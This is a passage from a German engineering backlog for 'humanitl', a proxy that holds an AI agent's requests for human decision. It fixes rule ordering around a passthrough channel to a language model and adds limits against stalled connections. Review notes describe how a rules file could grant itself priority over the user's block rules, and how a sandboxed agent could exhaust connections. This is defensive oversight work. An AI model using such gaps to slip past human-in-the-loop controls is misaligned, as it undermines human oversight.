verschoben. Neu ist dafür eine Naht, die sie sichtbar hält: Der Dart-Test
`fakeFilterKeys is the KEYS list of the recorder, in order` liest `KEYS` aus
`filter.rs` und vergleicht die Liste; läuft der Fake weg, wird er rot.

**Die Farbe der Zeile.** `historyVisualState` fängt einen Meta-Fluss vor allem
anderen ab. Ohne das fiele er über `FlowVisualState` auf `held` — die Zeile sähe
aus, als warte sie auf einen Menschen. Er bekommt bis auf Weiteres das Violett
der Durchreiche (`HFlowState.passthroughLlm`), die Farbe, die dieses Produkt
schon für den eigenen Kanal des Agenten benutzt (die `AgentAsk`-Karte, 4.24).
Ein eigener `HFlowState.meta` gehört in `app/packages/ui` neben die anderen acht
und ist hier bewusst nicht angelegt: Das Paket gehörte in diesem Durchgang einem
anderen Agenten. **Offen, klein, benannt.**

**Vier Lücken, die erst Mutationsproben und Reviews gefunden haben.** Die
Übertragung des Vermerks auf die Leitung (`recorded_summary_to_proto`) und die
zurück in die Domäne (`FlowSummaryToDomain`) waren zuerst von keinem Test
gedeckt: Beide Zeilen ließen sich entfernen, ohne dass irgendetwas rot wurde,
während die Oberfläche danach jeden Meta-Fluss wie eine unentschiedene Anfrage
gezeigt hätte. Dafür stehen jetzt `the_mark_of_a_meta_flow_reaches_the_wire`
(Rust) und `the mark crosses the wire` (Dart). Dazu aus dem Review: Der Vertrag
nagelte die Feldnummer nicht fest — der Frische-Test belegt nur, dass Deskriptor
und `.proto` zueinander passen, eine geänderte Nummer wäre grün geblieben, und
ältere Clients läsen für jeden Meta-Fluss still `false`; das prüft jetzt
`the_meta_mark_keeps_its_field_number` (Nummer 25, `TYPE_BOOL`, allein). Und
`summary_json()` ließ `meta` weg, sodass `humanitl flows list --json` genau die
Unterscheidung verlor, um die es hier geht; Feld ergänzt,
`the_json_tells_a_meta_flow_from_an_undecided_one` hält es fest.

**Nicht angefasst, geprüft:** Der Demolauf M2 (`tests/e2e/m2_first_decision/run.sh`)
schickt keine Anfrage an `humanitl.internal`; seine siebzehn Zeilen und alle
Zählungen darin bleiben, wie sie sind. `daemon/crates/audit/` ist bis heute ein
leerer Rumpf, das Nicht-Ziel „`/ask` bleibt auditiert wie bisher" also gegenstandslos.
`tests/fixtures/filter-language.json` gibt es noch nicht (HUM-099, Sprint 5).

## HUM-104 · Die Durchreiche zum Sprachmodell steht hinter den Regeln des Nutzers
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-037, HUM-039, HUM-066 · Blockiert: HUM-067, HUM-046

### Kontext
`daemon/bin/humanitld/src/main.rs:629-634` schiebt die Durchreichregel in dieselbe Liste wie die mitgelieferten Regeln, mit dem Kommentar: „Die Durchreiche steht vor allem anderen … eine Blockregel des Profils `llm-only` (`host: \"**\"`) stünde sonst davor." Das trifft nicht zu. `State::all()` in `daemon/crates/proxy/src/rules_store.rs:163-170` hängt die mitgelieferten Regeln **hinter** die Sitzungsregeln und die dauerhaften Regeln des Nutzers. Die Durchreiche ist damit die **letzte** Regel des Satzes, nicht die erste.

`RuleSet::prepend_bundled` — die Funktion, die genau diese Reihenfolge herstellen würde — hat außerhalb von Tests **keinen einzigen Aufrufer**. Die vier Fundstellen liegen in `daemon/crates/rules/tests/eval.rs`, `daemon/crates/sandbox/tests/default_rules.rs` und `daemon/crates/config/tests/profiles.rs`. Die grünen Tests messen also Code, den der Daemon nie ausführt.

Zwei Folgen, beide ernst:

1. **Das Profil `llm-only` blockt das Sprachmodell.** `profiles/llm-only.toml:35` bringt `block host "**"` als Regel der Profil-Ebene. Sein eigener Kommentar (Zeilen 8 bis 10) erklärt: „Der Agent-Adapter stellt seine Durchreichregel zum Sprachmodell voran … Sie trifft vor der Blockregel unten, denn die erste passende Regel gewinnt." Nach der tatsächlichen Reihenfolge trifft die Blockregel zuerst. `humanitl run --profile llm-only` — die reine Inferenz-Instanz, die dieser Sprint verspricht — erreicht damit sein eigenes Modell nicht. Heute ist das latent, weil `Profile::rules_document()` (`daemon/crates/config/src/profile.rs:432`) außer in Tests keinen Leser hat und die Verdrahtung erst mit HUM-067 kommt; über eine eigene `rules.yaml` mit `block **` ist es schon jetzt auslösbar.

2. **Der erklärte Seitenkanal wird still zum gewöhnlichen Allow.** `pipeline.rs:350` erkennt die Durchreiche daran, dass **diese** Regel entschieden hat. Trifft vorher eine `allow`-Regel des Nutzers denselben Host, gibt es kein `DecisionSource::Passthrough` und keine Warnung `LLM_005` vor Funden. Der Kanal, den `docs/SECURITY.md` als bewusste, protokollierte Ausnahme beschreibt, verliert genau die Merkmale, die ihn erklärbar machen.

Dazu widersprechen sich drei Stellen im Repository: `daemon/crates/rules/src/eval.rs:394` sagt „die Regeln des Nutzers rücken dahinter (CONVENTIONS 4.5)", `daemon/crates/proxy/src/rules_store.rs:20-24` sagt für dieselbe Nummer „Sitzung, dauerhaft, mitgeliefert", und `docs/profiles.md:171-175` (aus HUM-066) beschreibt „die Durchreichregel des Agent-Adapters, dann seine mitgelieferten Regeln, dann die Dateien und Regeln der Profile, zuletzt die `rules.yaml` des Nutzers". `backlog/CONVENTIONS.md` 4.5 selbst sagt zu den mitgelieferten Regeln nichts.

### Ziel
Es gibt genau eine Auswertungsreihenfolge, sie steht an einer Stelle geschrieben, der Code hält sie ein, und die Durchreiche steht dort, wo beide Kommentare und das Profil sie behaupten.

### Nicht-Ziel
Keine Aufweichung von HUM-027: der Nutzer muss eine mitgelieferte Regel weiterhin überstimmen können. Keine Verdrahtung von `Profile::rules_document()` — das bleibt HUM-067.

### Betroffene Pfade
- `daemon/crates/rules/src/eval.rs`: die Auswertung
- `daemon/crates/proxy/src/rules_store.rs`: `State::all` und der Doc-Kommentar
- `daemon/bin/humanitld/src/main.rs`: die Einordnung der Durchreiche
- `backlog/CONVENTIONS.md` 4.5: die eine Reihenfolge, mit Begründung
- `docs/profiles.md`, `profiles/llm-only.toml`: die Kommentare, die heute Falsches sagen
- `daemon/crates/proxy/tests/`: der Systemtest, der heute fehlt

### Spezifikation
**Erste zu treffende Entscheidung: welche Reihenfolge gilt.** Zwei Wege stehen zur Wahl, und beide sind vertretbar:

1. **Vier Gruppen.** Durchreiche, dann Sitzung, dann Nutzer, dann mitgeliefert. Das ist der kleinste Eingriff: `evaluate` bekommt neben dem vorhandenen Durchgang über `session_scoped` einen weiteren für die Durchreiche. HUM-027 bleibt vollständig erhalten — der Nutzer überstimmt die mitgelieferten Regeln weiter —, und der eine Fall, der wirklich vorn stehen muss, steht vorn.
2. **Mitgeliefert ganz nach vorn**, wie `docs/profiles.md:171` es beschreibt. Dann muss die Ausweichregel aus `rules_store.rs:923` (`immutable_bundled`) `Expiry::Session` tragen statt des `Expiry::Never`, das `Rule::new` setzt — sonst landet sie hinter der mitgelieferten Regel, und der Fix, den `RULES_010` vorschlägt, verspricht etwas Unmögliches. Dasselbe gilt für `overrideBundled` in `app/lib/features/rules/editor.dart`.

Weg 1 ist der empfohlene. Was auch gewählt wird: `RuleSet::prepend_bundled` wird verdrahtet oder entfernt. Eine Funktion, die die richtige Reihenfolge herstellt und nie gerufen wird, ist schlimmer als ihr Fehlen, weil ihre grünen Tests Sicherheit vortäuschen.

### Tests
- Ein Systemtest über den echten Ladeweg (`load_rules` bis `RulesStore::list`), nicht über `prepend_bundled` von Hand: eine Nutzerregel `block host "**"` und eine Durchreiche zum Modell — die Anfrage an das Modell wird durchgereicht, mit `DecisionSource::Passthrough`.
- Derselbe Test mit `allow host "**"`: die Anfrage trägt weiterhin `DecisionSource::Passthrough` und die Warnung `LLM_005` bei einem Fund, statt still als gewöhnliches Allow zu gelten.
- Ein Test, dass eine Nutzerregel eine **mitgelieferte** Regel weiterhin überstimmt (HUM-027 bleibt).
- Mutationsprobe: die Durchreiche zurück ans Ende der Liste, dann werden die ersten beiden Tests rot.

### Akzeptanzkriterien
- [x] Die Entscheidung ist getroffen und in `backlog/CONVENTIONS.md` 4.5 mit Begründung festgehalten; `eval.rs`, `rules_store.rs` und `docs/profiles.md` sagen alle dasselbe.
- [x] Die Durchreiche trifft vor jeder Regel des Nutzers, belegt über den echten Ladeweg.
- [x] Eine Nutzerregel überstimmt weiterhin eine mitgelieferte.
- [x] `RuleSet::prepend_bundled` ist verdrahtet oder entfernt; kein Test misst mehr Code, der im Daemon nicht läuft.
- [x] Der Kommentar in `profiles/llm-only.toml` und der in `main.rs` stimmen mit dem Verhalten überein.
- [x] `make check`, clippy mit `-D warnings` und `cargo fmt --all -- --check` grün.

### Fallstricke
- Der Fall ist heute nur deshalb nicht sichtbar, weil das Profil noch nicht verdrahtet ist. Wer HUM-067 vor diesem Issue baut, bekommt eine Inferenz-Instanz, die ihr eigenes Modell blockt.
- `pipeline.rs:350` erkennt die Durchreiche an der entscheidenden Regel. Jede Lösung, die die Durchreiche nur „meistens" zuerst treffen lässt, lässt auch das Merkmal manchmal verschwinden — und ein Seitenkanal, der manchmal protokolliert wird, ist keiner.

### Ergebnis (2026-09-04)
Gewählt wurde Weg 1, die vier Gruppen. Alle vier Ränge macht `RuleSet::evaluate` über den neuen Typ `Tier`, je ein Durchgang: mitgelieferte Durchreiche, Sitzungsregeln des Nutzers, dauerhafte Regeln des Nutzers, alles übrige Mitgelieferte. Weg 2 wurde verworfen: Er hätte HUM-027 aufgehoben und den stillen Fall nicht gelöst, denn eine Sitzungsregel `allow host "**"` hätte die Durchreiche weiterhin überdeckt. Begründung in `backlog/CONVENTIONS.md` 4.5.

Aus den Reviews kamen zwei Hälften derselben Lücke, beide behoben. Antigravity: Der Rang hing an `passthrough_llm`, und dieses Feld liest `parse_rules` aus der `rules.yaml` des Nutzers und aus den Inline-Regeln eines Profils — eine Datei konnte sich also den Rang selbst ausstellen und ihre eigenen Block-Regeln ungehalten überholen. Codex: Dieselbe Lücke über `bundled`, und dazu ein Loch in HUM-027 — eine mitgelieferte Regel mit `expires: session` fiel in den Sitzungsdurchgang und stand damit vor den dauerhaften Regeln des Nutzers. Ergebnis: Rang 1 verlangt `passthrough_llm` **und** `bundled`; `bundled` gehört dem Lader (`RuleSet::add_bundled`) und wird von `parse_rules` verworfen und mit `RULES_010` gemeldet; `bundled` schlägt `expires`, damit Rang 4 nicht über die Gültigkeit umgangen werden kann. `rules/default.yaml` schreibt den Vermerk deshalb nicht mehr hin. Die Lehre steht als Satz in `CONVENTIONS.md` 4.5.

`RuleSet::prepend_bundled` heißt jetzt `RuleSet::add_bundled`, hängt hinten an statt vorn und wird von `snapshot_of` gerufen — also auf dem Weg, den der Daemon geht.

Tests über den echten Ladeweg: `load_rules_evaluates_the_passthrough_before_every_rule_of_the_user` und `load_rules_lets_a_user_rule_override_a_bundled_one` in `daemon/bin/humanitld/src/main.rs`, dazu `daemon/crates/proxy/tests/rules_order.rs` (fünf Fälle über `RulesStore::load` und die Proxy-Pipeline, mit `DecisionSource::Passthrough`, `LLM_005` und der Aufzeichnung). Für die Herkunft: `a_passthrough_written_into_rules_yaml_does_not_outrank_the_user` (Speicher), `a_file_cannot_declare_a_rule_bundled` und `a_passthrough_from_a_file_does_not_reach_the_first_rank` (Engine), `a_profile_cannot_declare_its_own_rule_bundled` (globales Profil), `a_session_scoped_bundled_rule_does_not_outrank_the_user` (HUM-027 gegen die Gültigkeit).

## HUM-120 · Drei unbewachte Spannen der Verbindung
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-062, HUM-101 · Blockiert: —

### Kontext
`limits.body_timeout_secs` (Vorgabe 300) wird in `daemon/crates/config/src/validate.rs:211` auf seinen Bereich geprüft und danach von niemandem gelesen. Seit HUM-101 trägt der Schlüssel im Register (`daemon/crates/config/tests/config_readers.rs`) `pending(HUM-120)` und in der Spalte „Wirkung" von `docs/CONFIG.md` den Vermerk `offen (HUM-120)`. Der Vermerk ist ehrlich, aber er ist keine Grenze.

Auf der Verbindung zum Agenten laufen drei Spannen ohne Uhr, und alle drei sind Stille, während etwas offen steht:

1. **Der Anfrage-Rumpf.** `handler.rs:597` puffert ihn über `body::buffer(incoming, cap)`, ohne Frist. Hypers Kopf-Uhr ist zu diesem Zeitpunkt gelöscht — sie wird gespannt, wenn ein Kopf gelesen wird, und fällt weg, sobald er geparst ist. Ein Client, der `Content-Length: 1000` ankündigt, zehn Bytes schickt und dann schweigt, hält Verbindung, Task und Hold-Budget unbegrenzt. Es greift allein `limits.hold_body_cap_bytes`, und das ist eine Byte-Grenze, keine Zeit.
2. **Der gestreamte Antwort-Rumpf.** `body.rs` (`TeeBody`) reicht jedes Stück durch und wartet auf das nächste, so lange es dauert. Bis zu den Antwort-Kopfzeilen deckt der `handshake_timeout` des Upstreams alles ab (`upstream.rs:267`, `:288`, `:301`, gespeist aus `limits.header_timeout_secs`); danach nichts mehr.
3. **Der TLS-Handschlag nach `CONNECT`.** `handler.rs:337` nimmt ihn über `tls::accept` entgegen, ohne Frist. Wer den Tunnel öffnet und nie ein `ClientHello` schickt, hält den Task für immer; die Kopf-Frist des inneren `serve_connection` beginnt erst nach dem Handschlag.

**Was dabei gebunden wird, und von wem.** Je stehengebliebener Verbindung bleibt eine Tokio-Aufgabe und ein Dateideskriptor liegen; beim gestreamten Antwort-Rumpf zusätzlich die Verbindung zum Ziel und eine offene `ResponseSink` der Aufzeichnung. Dazu kommt das eigentliche Vielfache: `accept_loop` (`daemon/crates/proxy/src/core.rs:134-149`) begrenzt die Zahl gleichzeitiger Verbindungen nicht. Ein Prozess in der Sandbox kann deshalb viele Unix-Ströme öffnen, je einen Kopf schicken und im Rumpf stehenbleiben. **Eine Uhr je Spanne ohne Obergrenze für gleichzeitige Verbindungen deckt nur die Hälfte**, deshalb gehört die Obergrenze in dieses Issue: ein neuer Schlüssel `limits.max_client_connections` (Sprint 5 nennt ihn bereits, `backlog/sprint-5.md:241`), der Accept-Loop lehnt darüber hinaus ab, statt anzunehmen und liegen zu lassen. Die drei Garantien bricht das alles nicht — es geht nichts hinaus, was niemand erlaubt hat —, aber der Host trägt die Last.

Der mit HUM-101 entfernte Schlüssel `limits.idle_timeout_secs` beschrieb wörtlich genau das („Sekunden ohne Bytes, nach denen eine offene Verbindung geschlossen wird"). Entfernt wurde er trotzdem zu Recht: Eine **eine** Uhr über der ganzen Verbindung trifft auch den Hold und den streamenden Antwort-Strom, in denen dieselbe Stille richtig ist (`backlog/CONVENTIONS.md` 4.25, empirisch belegt in `daemon/crates/proxy/tests/timeouts.rs`). Was fehlt, sind Grenzen **je Spanne** mit eigenen Namen — dieses Issue baut sie.

### Ziel
Die drei Spannen haben eine Grenze, `limits.body_timeout_secs` speist die beiden Rumpf-Spannen, `limits.header_timeout_secs` den Handschlag, und das Register führt `limits.body_timeout_secs` danach als `effective`.

### Nicht-Ziel
Keine zweite Uhr über der ganzen Verbindung: `limits.header_timeout_secs` bleibt die einzige Leerlaufgrenze zwischen zwei Anfragen (HUM-101). Keine Grenze am Hold — er ist die Stille, für die es Humanitl gibt — und keine an der Byte-Menge; `limits.hold_body_cap_bytes` bleibt, wie es ist.

### Betroffene Pfade
- `daemon/crates/proxy/src/body.rs`: die Grenze am `TeeBody` und um `body::buffer`
- `daemon/crates/proxy/src/handler.rs`: `ProxyLimits` bekommt die Frist, `body::buffer` (Zeile 597) und `body::tee` (Zeile 984) reichen sie durch, `tls::accept` (Zeile 337) bekommt die Kopf-Frist
- `daemon/crates/proxy/src/core.rs`: die Obergrenze gleichzeitiger Verbindungen im Accept-Loop
- `daemon/crates/proxy/tests/timeouts.rs`: die neuen Paar-Tests neben den vier Fällen aus HUM-101
- `daemon/crates/config/src/model.rs` (Doku-Kommentar und `x-pending-issue`), `daemon/crates/config/tests/config_readers.rs` (Registerzeile auf `effective`)
- `docs/CONFIG.md` (Generatorlauf), `docs/SECURITY.md` (der Vorbehalt in der Grenzen-Tabelle entfällt), `backlog/CONVENTIONS.md` 4.4 und 4.25

### Spezifikation
**Die Grenze begrenzt die Stille zwischen zwei Stücken, nicht die Gesamtdauer — und das ist eine Umdeutung.** Heute sagen Schema, Doku und `docs/CONFIG.md` „Sekunden, in denen ein Body vollständig übertragen sein muss". Eine Gesamtdauer von 300 Sekunden risse den Strom des lokalen Sprachmodells ab, dazu jeden langen Download und jeden großen Upload — also genau den erklärten Seitenkanal und den Normalfall. Die Umdeutung gehört deshalb ausgesprochen: Doku-Kommentar in `model.rs`, `docs/CONFIG.md` aus dem Generatorlauf und `backlog/CONVENTIONS.md` 4.4 im selben Commit.

**Vorher zu entscheiden:** ein Name für beide Rumpf-Spannen oder zwei. Sprint 5 hatte zwei vorgesehen (`limits.client_body_timeout_secs` für die Anfrage, `limits.response_idle_timeout_secs` für die Antwort, `backlog/sprint-5.md:231` und `:233`). Wer sie vorzieht, benennt `limits.body_timeout_secs` um und trägt den alten Pfad in `alias::RETIRED` ein, damit eine bestehende Datei eine Warnung bekommt und keinen Fehler (CONVENTIONS 4.25). Wer bei einem Namen bleibt, schreibt in den Doku-Kommentar, dass er beide Richtungen deckt. Was gewählt wird, steht danach in CONVENTIONS 4.4.

**Der Ausgang je Spanne.** Der Anfrage-Rumpf hat eine Anfrage in Flug und kann deshalb eine Antwort tragen: `408`, `Connection: close`, wie `text_response` sie baut. Ob dafür ein eigener `BlockReason` nötig ist oder der vorhandene Fehlerpfad von `body::buffer` reicht (`BufferError::Read` endet heute mit `400`), entscheidet das Issue am Code — ein neuer Grund zieht Proto, `ipc/src/convert.rs` und die Dart-Seite nach sich, dazu CONVENTIONS 3.2. Der Antwort-Rumpf hat seine Kopfzeilen längst beim Client; er endet wie ein abgebrochener Strom (`ResponseSink::abort`, Mitschnitt als gekürzt, Flow über `TransitionInput::Record`), und es entsteht kein neuer Grund. Der Handschlag hat noch keinen Flow; er endet still, mit einer Protokollzeile, wie ein gescheiterter Handschlag heute auch (`tls_observe`).

**Die Zeit kommt aus einer einspeisbaren Uhr, nie aus der Wanduhr.** `hyper::rt::Timer` ist im Proxy vorhanden (`TokioTimer` in `serve_connection`); ein Test, der 300 Sekunden wartet, ist kein Test.

### Tests
- Paar-Test Anfrage-Rumpf: ein Client, der `Content-Length` ankündigt und nach zehn Bytes schweigt, bekommt `408` und die Verbindung wird geschlossen; mit hoher Grenze läuft dieselbe Anfrage zu Ende.
- Paar-Test Antwort-Rumpf: ein Ziel, dessen zweites Stück zu spät kommt, wird abgebrochen; mit hoher Grenze läuft der Strom zu Ende.
- Paar-Test Handschlag: ein `CONNECT` ohne `ClientHello` endet nach der Kopf-Frist; ein regulärer Handschlag nicht.
- Die drei Fälle aus HUM-101 (`daemon/crates/proxy/tests/timeouts.rs`) bleiben grün: gehaltene Anfrage und streamende Durchreiche überleben, die leere Verbindung nicht.
- Die Aufzeichnung des abgebrochenen Antwort-Rumpfs ist als gekürzt vermerkt, nicht als vollständig.
- `config_readers`: `limits.body_timeout_secs` steht auf `effective`, und `docs/CONFIG.md` zeigt `ja`.

### Akzeptanzkriterien
- [x] Alle drei Spannen haben eine Grenze; für jede belegt ein Paar-Test beide Richtungen (`daemon/crates/proxy/tests/timeouts.rs`).
- [x] Die Zahl gleichzeitiger Verbindungen je Sitzung ist begrenzt (`limits.max_client_connections`), und ein Test belegt, dass die Verbindung über der Grenze abgelehnt wird, statt angenommen und liegen gelassen zu werden. Zwei Tests: einer mit gewöhnlichen Anfragen, einer mit `CONNECT`-Tunneln vor und nach dem `ClientHello` — der Tunnel ist der Fall, in dem `serve_connection` zurückkehrt, während die Verbindung lebt.
- [x] **Geändert in HUM-120, vorher: „Jeder Paar-Test läuft über eine einspeisbare Uhr und in unter einer Sekunde Wanduhrzeit."** Es gilt stattdessen: Jeder Paar-Test nimmt seine Zeit aus `tokio::time` (nie aus der Wanduhr des Codes) und läuft mit **zwei verschiedenen konfigurierten Werten**, von denen jeweils die untere **und** die obere Schranke geprüft wird; die ganze Datei braucht 4,4 Sekunden Wanduhrzeit. Grund für die Änderung: Die kleinste Einheit dieser Schlüssel ist eine Sekunde, zwei Werte kosten also mindestens vier Sekunden, und `start_paused` ist für Tests über echte Sockets nachweislich untauglich — bei konfigurierter 1 s gemessene Spanne 29,952 s (Lesefrist des Tests 30 s) beziehungsweise 1798,144 s (1800 s). Die Zahlen und der Versuch stehen im Stand-Abschnitt.
- [x] Eine gehaltene Anfrage und eine streamende Durchreiche zum Sprachmodell werden nicht abgebrochen (die Tests aus HUM-101 bleiben grün).
- [x] Der Doku-Kommentar von `limits.body_timeout_secs` beschreibt die Stille zwischen zwei Stücken, und `docs/CONFIG.md` sowie CONVENTIONS 4.4 sagen im selben Commit dasselbe.
- [x] Das Leser-Register führt `limits.body_timeout_secs` als `effective`; `docs/SECURITY.md` verliert den Vorbehalt in der Grenzen-Tabelle.
- [x] **Neu in HUM-120:** Die Kürzung ist auch in der Ausgabe sichtbar. HAR trägt sie in `content.comment` und in `_humanitl.response_body_truncated`, CSV in der Spalte `response_body_truncated`; JSON Lines trug sie schon. Je ein Test mit `truncated == true` (`app/test/features/history/history_export_test.dart`).
- [x] `make check`, clippy mit `-D warnings` und `cargo fmt --all -- --check` grün.

### Fallstricke
- Eine Gesamtdauer statt einer Stille tötet den erklärten Seitenkanal zum Sprachmodell und jeden langen Upload. Wer die Grenze so baut, wie der heutige Doku-Kommentar sie beschreibt, baut sie falsch.
- `TeeBody::finish` läuft auch im `Drop`. Die Uhr darf den Flow nicht ein zweites Mal abschließen.
- Die Uhr am Anfrage-Rumpf darf erst nach dem Kopf laufen und nicht schon während des Wartens auf die nächste Anfrage; sonst deckt sie dieselbe Spanne wie `limits.header_timeout_secs`, und es gäbe wieder zwei Uhren für eine Spanne (HUM-101).
- `Expect: 100-continue` beantwortet hyper beim ersten Lesen des Rumpfs. Die Uhr beginnt danach, sonst trifft sie einen Client, der auf `100 Continue` wartet.
- Drei Uhren schließen die Spannen, aber nicht die Menge: Ohne Obergrenze für gleichzeitige Verbindungen bindet derselbe Angriff dieselben Ressourcen, nur kürzer. Beides gehört in denselben Commit.

### Stand (2026-09-05)

Gebaut: alle drei Spannen haben eine Uhr, dazu die Obergrenze für gleichzeitige Verbindungen. Was von der Spezifikation abweicht oder über sie hinausgeht, steht unten mit Begründung; die dauerhaften Namen und die Umdeutung stehen in `backlog/CONVENTIONS.md` 4.4, der Nachtrag zu 4.25 verweist hierher.

**Die Uhr allein reicht nicht, und die Obergrenze allein auch nicht.** Eine Uhr je Spanne begrenzt, wie lange eine einzelne Verbindung stehenbleiben darf. Sie begrenzt nicht, wie viele davon es gibt: Wer mit dem Ablauf der Frist bezahlt, öffnet einfach die nächste, und jede einzelne bleibt innerhalb ihrer Frist — gemessen wurden vorher fünfhundert gleichzeitig offene, ohne dass `limits.hold_max_flows` griff (es entstand kein Fluss) und ohne dass die gepufferten Bytes gegen `limits.hold_max_bytes` zählten (dessen Buchführung beginnt erst mit dem Halten). Umgekehrt begrenzt die Obergrenze allein nur die Zahl, nicht die Dauer: 256 Verbindungen, die für immer stehenbleiben, sind 256 Aufgaben und Deskriptoren, die nie zurückkommen, und der Agent hätte danach überhaupt keinen Weg mehr nach draußen — die Grenze wäre dann seine eigene Selbstsperre. Erst beide zusammen ergeben eine Schranke, die sich wieder öffnet.

**Die Grenze ist keine Waffe gegen den Menschen.** Zwei Wege wären denkbar gewesen, und beide sind zu. Der erste: der Ereignisstrom. Ein Befund je abgelehnter Verbindung hätte den Broadcast mit `limits.event_buffer` Plätzen überlaufen lassen und der Oberfläche `Lagged` beschert, also die Sicht auf echte Flüsse gekostet; deshalb kommen `PROXY_010` und `PROXY_011` zusammengefasst. Der zweite: der Weg des Agenten zum Menschen. Die Oberfläche hängt am gRPC-Socket und nicht am Proxy-Socket, ist also unberührt; der Meta-Endpunkt `humanitl.internal`, über den der Agent selbst fragt, teilt sich dagegen die Verbindungen mit allem anderen. Ein Agent, der seine eigene Grenze ausreizt, sperrt damit seine eigene Bitte aus — nicht die Sicht des Menschen, und die Ablehnungen stehen ihm im Ereignisstrom. Ein eigenes Kontingent für den Meta-Endpunkt wäre erst dann richtig, wenn `/ask` einen eigenen Weg bekäme; heute wäre es eine Reserve, die jede beliebige Anfrage benutzen könnte, weil erst nach dem Lesen des Kopfes feststeht, wohin sie geht.

**Der Platz überlebt den Aufstieg zum Tunnel.** Der erste Entwurf hielt den Semaphor-Platz an der Lebensdauer von `serve_connection`. Bei einem `CONNECT` ist das falsch: hyper übergibt die Verbindung an `hyper::upgrade::on`, `serve_connection` kehrt dabei zurück, und der Tunnel lebt in einer eigenen Aufgabe weiter. `limits.max_client_connections` hätte damit nur einfaches HTTP gedeckt und ausgerechnet nicht die TLS-Tunnel, über die der Agent den überwiegenden Teil seines Verkehrs führt — die Grenze hätte den kleineren Teil geschlossen und den größeren offen gelassen. Beide Reviewer haben denselben Punkt unabhängig gefunden. Der Platz wandert deshalb als `Arc<OwnedSemaphorePermit>` (`ConnectionSlot`) durch `serve_connection` in die aufsteigende Aufgabe und wird erst frei, wenn die letzte Hälfte der Verbindung fällt. Ein zweiter solcher Ausgang existiert nicht: `hyper::upgrade::on` steht im Proxy nur im `CONNECT`-Pfad, und ein `101` vom Ziel nimmt niemand entgegen, hyper lässt die Verbindung dann fallen.

Der erste Entwurf des Tests hatte denselben blinden Fleck und hielt nur halb gesendete gewöhnliche Anfragen. Er hält jetzt zwei `CONNECT`-Tunnel, in beiden Stufen: **vor** dem `ClientHello` (das trifft die Handschlag-Spanne und die Mengengrenze zugleich) und nach fertigem Handschlag. Dazu die Gegenprobe, dass der Platz zurückkommt, sobald die Tunnel fallen.

**Die Ablehnung leert den Empfangspuffer, bevor sie schließt.** Ein Client, der zugleich mit dem Verbinden seine Anfrage schickt, hat ihre Bytes im Empfangspuffer des Sockets liegen. Fällt der Socket mit ungelesenen Bytes, schickt der Kern ein `RST` statt eines ordentlichen Schlusses, und mit dem `RST` geht die `503` verloren, die gerade den Grund erklären sollte. Nachgemessen mit abgeschaltetem Leeren: `Os { code: 104, kind: ConnectionReset }` beim Client, die Antwort weg. `write_refusal` schreibt deshalb, schließt die Schreibrichtung und liest danach bis zum Dateiende oder bis 64 KiB weg; die Frist von einer Sekunde deckelt das Ganze. Der Test schickt seine Anfrage jetzt sofort, sonst läge nichts im Puffer und die Zusicherung träfe ins Leere.

**Ein Name für beide Rumpf-Spannen, nicht zwei.** `limits.body_timeout_secs` speist den Anfrage-Rumpf und den gestreamten Antwort-Rumpf. Die zwei Namen aus `backlog/sprint-5.md` (`limits.client_body_timeout_secs`, `limits.response_idle_timeout_secs`) hätten zwei Zahlen für dieselbe Aussage bedeutet — „so lange darf ein Rumpf schweigen" — und dazu einen Eintrag in `alias::RETIRED`, damit eine bestehende Datei nur eine Warnung bekommt. Für zwei getrennte Werte gab es keinen Fall: Wer die eine Richtung großzügiger einstellen will als die andere, hat dafür bisher kein Beispiel genannt, und ein Schlüssel, den niemand verschieden setzt, ist ein Schlüssel zu viel. `backlog/CONVENTIONS.md` 4.25 nennt ohnehin bereits den einen Namen, und Abschnitt 4 geht vor dem Sprint-File.

**`Expect: 100-continue`, genau genommen.** Der Fallstrick verlangt, dass die Uhr erst nach der Antwort `100 Continue` beginnt. Gebaut ist sie so, wie hyper es zulässt: `body::buffer` spannt die Frist unmittelbar vor dem ersten Lesen, und genau dieses Lesen ist es, das hyper das `100 Continue` schreiben lässt. Eingerechnet ist damit die Zeit, die das Schreiben dieser 25 Bytes auf den Unix-Socket braucht — nicht das Warten des Clients darauf, denn das beginnt erst danach. Einen Haken, der zwischen beidem liegt, bietet hyper 1.11 nicht, und eine eigene Behandlung von `Expect` im Proxy wäre eine Abstraktion über der Fremdbibliothek.

**Die Uhr misst die Stille zwischen zwei Stücken.** Der Doku-Kommentar in `daemon/crates/config/src/model.rs`, `docs/CONFIG.md` (aus dem Generatorlauf) und CONVENTIONS 4.4 sagen das jetzt gleichlautend. `body::buffer` spannt die Frist vor jedem Stück neu, `TeeBody` setzt sie nach jedem Frame zurück. Eine Gesamtdauer hätte den Strom des lokalen Sprachmodells zerrissen — den erklärten Seitenkanal — und dazu jeden großen Upload.

**Der Ausgang je Spanne.**

| Spanne | Uhr | Ausgang | Fluss |
|---|---|---|---|
| Anfrage-Rumpf | `limits.body_timeout_secs` | `408 Request Timeout`, `Connection: close`, Befund `PROXY_011` | keiner |
| Gestreamter Antwort-Rumpf | `limits.body_timeout_secs` | Strom bricht ab, Mitschnitt über `ResponseSink::abort` als gekürzt, Flow über `TransitionInput::Record` | der bestehende |
| TLS-Handschlag nach `CONNECT` | `limits.header_timeout_secs` | stiller Schluss, Protokollzeile | keiner |
| Verbindungsgrenze | `limits.max_client_connections` | `503 Service Unavailable`, `Connection: close`, `reason: max_client_connections`, Befund `PROXY_010` | keiner |

**Kein neuer `BlockReason`.** Der Anfrage-Rumpf endet über den bestehenden Fehlerpfad von `body::buffer`, um eine dritte Variante `BufferError::Idle` erweitert. Ein neuer Grund hätte Proto, `daemon/crates/ipc/src/convert.rs`, die Dart-Seite und CONVENTIONS 3.2 nachgezogen — und er wäre die falsche Aussage: Geblockt hat niemand, es gab keine vollständige Anfrage und damit nichts, worüber ein Mensch hätte entscheiden können. Aus demselben Grund entsteht kein Fluss: Ein Fluss trägt eine Anfrage, und genau die fehlt.

